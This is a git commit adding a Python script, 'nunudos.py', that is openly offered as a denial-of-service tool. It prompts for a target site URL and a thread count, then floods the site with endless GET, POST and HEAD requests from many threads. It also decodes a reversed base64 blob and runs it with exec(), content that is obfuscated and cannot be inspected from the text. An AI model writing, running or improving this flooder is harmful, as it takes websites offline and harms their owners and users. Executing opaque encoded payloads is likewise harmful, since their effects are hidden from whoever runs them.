50a08fbe288c0079f023d62b3b40c7ff9a202e1c
Tamim_Danger <114051208+us-nexus-hackers@users.noreply.github.com>
2023-09-07 01:27:25 +0600

    Add files via upload

---
+++ nunudos.py
@@ -0,0 +1,54 @@
+from colorama import init, Fore, Back, Style
+import requests
+import time
+import threading
+import os 
+import random
+import user_agent
+
+init(autoreset=True)
+red = Fore.RED
+green = Fore.GREEN
+cyan = Fore.CYAN
+magenta = Fore.MAGENTA
+yellow = Fore.YELLOW
+
+os.system("clear")
+os.system("pkg install espeak")
+os.system("clear")
+os.system('espeak -a 500 "Welcame To US NEXUS NUNUDOS"')
+
+    
+def ddos():
+    while 1:
+        try:      
+            res = requests.get(url)
+            rep = requests.post(url)
+            rep = requests.head(url)
+            print(red + f"[+] Request Sent  Successfully @usnexushacker NUNUDOS\n")
+           
+
+        except requests.exceptions.ConnectionError:
+            print(red + "[+] Website Down With NUNU DOS @usnexushacker (JOIN)\n")
+   
+
+    
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=oQKiIiIKoAIyEDI+BiVgY2Tg42bpNnclZFI4K4kwDJgTCPIg0WMzsDMbNzMwwlCACq4ACq4ACq4ACq4ACq4ACq4ACq4yV2ajFGazVHel52c19SZt5Cdv8iOzBHd0hGIr5WaMBCbl5mbhh2QgIXdPBSbxMzOws1MzADXKs2YvNEInlmQggGdpdFIhASbhpEIuVWZCBychhEIptGd1BFIyVGa09WTgU3bZBybTBCdpRWZyNEIyV3bgQXdvhGdpdHIlJXYoNHI19WegYWSg0WMzsDMbNzMwwlChACdpRWZyNEIyV3TgQXdvhGdpdFIlJXYoNFI052bEBSbxMzOws1MzADXKASINFURUBiUFJUWDByUVhVROByUVBCIgACIgACIgACIgACIgACIgACIg4CggKOggKOggKeggKeigKOggKOggKOggKebxMzOws1MzADXKAIoiDIoinIoivJoi/Loi/7oi77oib7oi/7oi/roivLoivJoi/Loi/boi77oib7oif7oi/7oi/LoivJoijIoiDIoiDIoi3WMzsDMbNzMwwlCBCq4fGq4+Oq4kOq4AOq4ACq4ACq4ACq4ACq4AGq4EOq43Oq4/Oq4gACIACq4ACq4ACq4AOq4mOq4/Oq47Cq4ACq4tFzM7AzWzMDMcpwvhKuvjKOgiKOggKOggKOggKOggKOggKOggKOggKOggKOggK+tjK+viKOggKOggKOggKOggKOggKOggKOhhK+vjKeuiKebxMzOws1MzADXK87oijroiDCIgACIgACIgACIgACIgACIgACIgACIgACIgYYoi/7oijroiDCIgACIgACIgACIgACggKOggK+hjK+vjKebxMzOws1MzADXK87oinroiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoi/Zoi/7oi3WMzsDMbNzMwwlCGOq4/Oq4ZCq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4PCq4/Oq4gKq4tFzM7AzWzMDMcpAggKOhjK+tjK+viKemgKeigKOigKOggKOggKOggKOggKOggKOggKOggKOggKOggKeggKeigK+mgK+vhKOtjKOgiKOggKebxMzOws1MzADXKAIoiDIoiDIoiDYoiT4oif6oi/7oiDIoiDIoiDIoiDIoiDIoiHIoi/Joi/7oif7oi/7oiT7oiD6oiDooiDIoiDIoiDIoi3WMzsDMbNzMwwlCACq4ACq4ACq4ACq4ACq4HGq4/Oq4ACq4ACq4ACq4ACq4HCq4/Oq40Oq4AKq4HGq4/Oq4ACq4ACq4ACq4ACq4ACq4ACq4tFzM7AzWzMDMcpAggKOggKOggKOggKOggK+hhK+vjKOggKOggKOggKOggK+vjKOujKOggKOggK+hhK+vjKOggKOggKOggKOggKOggKOggKebxMzOws1MzADXKAIoiDIoiDIoiDIoiDIoifYoi/7oiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoifYoi/7oiDIoiDIoiDIoiDIoiDIoiDIoi3WMzsDMbNzMwwlCACq4ACq4ACq4ACq4ACq4HGq4/Oq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4HGq4/Oq4ACq4ACq4ACq4ACq4ACq4ACq4tFzM7AzWzMDMcpAggKOggKOggKOggKOggK+hhK+vjKOggKOggKOggKOggKOggKOggKOggKOggK+hhK+vjKOggKOggKOggKOggKOggKOggKebxMzOws1MzADXKAIoiDIoiDIoiDIoiDIoifYoi/7oiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoifYoi/7oiDIoiDIoiDIoiDIoiDIoiDIoi3WMzsDMbNzMwwlCACq4ACq4ACq4ACq4ACq4HGq4/Oq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4HGq4/Oq4ACq4ACq4ACq4ACq4ACq4ACq4tFzM7AzWzMDMcpAggKOggKOggKOggKOggK+hhK+vjKOggKOggKOggKOggKOggKOggKOggKOggK+hhK+vjKOggKOggKOggKOggKOggKOggKebxMzOws1MzADXKAIoiDIoiDIoiDIoiDIoifYoi/7oinIoinIoiDIoiDIoiDIoiDIoiHIoinIoi/Yoi/7oiDIoiDIoiDIoiDIoiDIoiDIoi3WMzsDMbNzMwwlCACq4ACq4ACq4ACq4BCq4fGq4/Oq42Oq42Oq43Oq4/Kq4fCq4/Gq4+Oq42Oq42Oq4/Oq47Cq4ACq4ACq4ACq4ACq4ACq4tFzM7AzWzMDMcpAggKOggKOggKOggK+vhK+vjKOggKOggKOggKOggKOgjKOpjKOgiKOggKOggKOggKOhhK+vjKOuiKOggKOggKOggKOggKebxMzOws1MzADXKAIoiDIoiDIoiDIoib4oi/7oijLoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoi/Yoi/7oiDqoiDIoiDIoiDIoiDIoi3WMzsDMbNzMwwlCACq4ACq4ACq4ACq4ACq4GOq4/Oq4ZCq4ACq4ACq4ACq4ACq4ACq4ACq4ACq4PCq4/Oq4gKq4ACq4ACq4ACq4ACq4ACq4tFzM7AzWzMDMcpAggKOggKOggKOggKOggKOggKOhjK+vjK+ugKeigK+hgK+vgKOggK+igK+vhKuvjKOgiKOggKOggKOggKOggKOggKOggKebxMzOws1MzADXKAIoiDIoiDIoiDIoiDIoiDIoiDIoiDYoiT6oif7oi/7oi/7oi/7oib7oiD6oiDIoiDIoiDIoiDIoiDIoiDIoiDIoiDIoi3WMzsDMbNzMwwlCtFzM7AzWzMDMcpwrVKegUKegUKegUK+uUKegUKegUKegUK+uUKegUKegUKegUK+uUKegUKegUKegUK+uUKegUKOsVKesVK+rVK+uUKegUKegUKegUK+uUKegUKOsVKesVK+rVKOsVKeb0MzOws1MzADXKMIli/aliHIliDbliPIli/aliHIliDbliPIli/aliDbli/aliPKli/aliHIliDbliPIliPIliPIliHbliPIliPIli/aliHIliDbliPIliPIliPIliHbliPIliPIli3GNzsDMbNzMwwlCDSp4uWp4BSp4BSp4jSp4DSp4xWp4DSp4DSp4DSp4DSp4DSp4DSp4DSp4xWp4DSp4DSp4DSp4uWp4wWp4DSp4DSp4DSp4xWp4DSp4DSp4DSp4uWp4wWp4DSp4DSp4tRzM7AzWzMDMcpgrVKegUKegUKOsVK+gUK+gUKesVK+gUK+gUK+gUK+gUK+gUK+gUK+gUKesVK+gUK+gUK+rVKOsVKurVKerVK+gUK+gUKesVK+gUK+gUK+rVKOsVKurVKerVK+gUKeb0MzOws1MzADXKMIli7aliHIli3aliPIli7aliHIli3aliPIli7ali3ali7aliPKliPIliHbliPIliPIliPIli7aliDbliPIliPIliPIliHbliPIliPIliPIli7aliDbliPIliPIli3GNzsDMbNzMwwlCuWp4BSp4BSp4BSp4zSp4BSp4BSp4BSp4zSp4BSp4BSp4BSp4zSp4tWp4xWp4uWp4zSp4tWp4xWp4uWp4BSp4zSp4tWp4xWp4uWp4zSp4tWp4xWp4uWp4BSp4tWp4tRzM7AzWzMDMcpwrVKegUKegUKegUK+uUKegUKegUKegUK+uUKegUKOsVK+rVKegUK+uUKegUKegUKegUK+uUKegUKOsVKesVK+rVK+uUKegUKegUKegUK+uUKegUKegUKegUKOsVKebyMzOws1MzADXKMIli/aliHIliDbliPIli/aliHIliDblivKliDbli7ali3ali/aliPLliHIliHIliDbliPIliPIliPIliHbliPIliPIli/aliHIliDbliPIli/aliHIliDbliPIli3mMzsDMbNzMwwlCDSp4uWp4BSp4BSp4jSp4DSp4xWp4DSp4DSp4uWp4wWp4vWp4tWp4vWp4BSp4BSp4tWp4DSp4DSp4uWp4wWp4DSp4DSp4uWp4BSp4BSp4jSp4DSp4xWp4DSp4DSp4tJzM7AzWzMDMcpgrVKegUKegUKOsVK+gUK+gUKesVK+gUK+gUK+rVKerVKurVKOsVKurVKegUKegUKOsVK+gUK+rVKOsVKurVKerVK+qUKegUKegUKOsVK+gUK+gUKesVK+gUK+gUKebyMzOws1MzADXKMIli7aliHIli3aliPIliPIliHbliPIlivKli3ali/aliDbli7alivLliHIliHIli3aliPIliPIli7aliDbliPIliPIli7aliHIli3aliPIliPIliHbliPIliPIli3mMzsDMbNzMwwlCuWp4BSp4BSp4BSp4zSp4tWp4xWp4uWp4zSp4BSp4tWp4uWp4BSp4zSp4BSp4BSp4BSp4zSp4tWp4xWp4uWp4BSp4zSp4BSp4BSp4BSp4zSp4tWp4xWp4uWp4tWp4tJzM7AzWzMDMcpgCiIiIoQnbpJHc'))
+
+key = input(yellow + f"Enter Licence key : ")
+
+
+print(cyan + f"Well Come To NUNU~DOS ")
+
+url = input(green + f"Site Url For Down =")
+
+print(cyan + f"Target Locked !!\n")
+
+thn = input(yellow + f"Threads Amount Of Putki Army:")
+
+print(yellow + f" Rps : NUNU DOS LOADED WITH 5.91 Mbps "
+"   Attacking...")
+
+for i in range(int(thn)):
+    thr = threading.Thread(target=ddos)
+    thr.start()
